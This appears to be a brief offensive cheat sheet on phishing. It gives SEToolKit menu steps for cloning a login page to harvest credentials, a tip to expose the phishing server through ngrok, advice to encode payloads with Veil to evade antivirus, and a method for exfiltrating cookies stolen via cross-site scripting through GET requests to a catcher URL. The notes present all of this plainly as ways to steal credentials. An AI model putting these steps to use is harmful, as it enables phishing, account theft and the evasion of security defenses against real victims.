Credential Harvesting

Use SEToolKit in order to steal credentials. Its relatively easy to perform a credential harvesting attack.

Steps for credential harvesting

  1. Run setoolkit (its instaled on kali linux by default), or clone it
  2. Select social engineering attacks
  3. Select website attack vectors
  4. Select credential harvesting

Steps for credential harvesting Continued

  1. Select web templates
  2. Find your ip address (In a new terminal window, run ifconfig)
  3. Select your desired website, and enter your ip address

Steps for credential harvesting Continued

  1. visit your ip address and sign in with fake credentials, they will appear in the SEToolKit window

Access an internal machine from the internet

Often, you will want to keep kali off the public internet, but still want to access it. You can use NGrok to do this.

Simply download it, add it to your $PATH, and run `ngrok http 80`

Evading AV

Often, when phishing, a malicious file instead of url will be used, but these are much more likely to be stopped by antivirus. For this, you will want to encode your payload.

You can encode your binary with Veil.

Angler

  • Occasionally, when doing things, you will want to exfiltrate some data.
  • I like to use use url requests for doing this. Angler
  • This can be used to steal cookies when combined with Cross-Site Scripting
  • just send a get request to [anglerurl]/catch/[data] with data
  • For example: http://127.0.0.1/catch/session=exampleSession
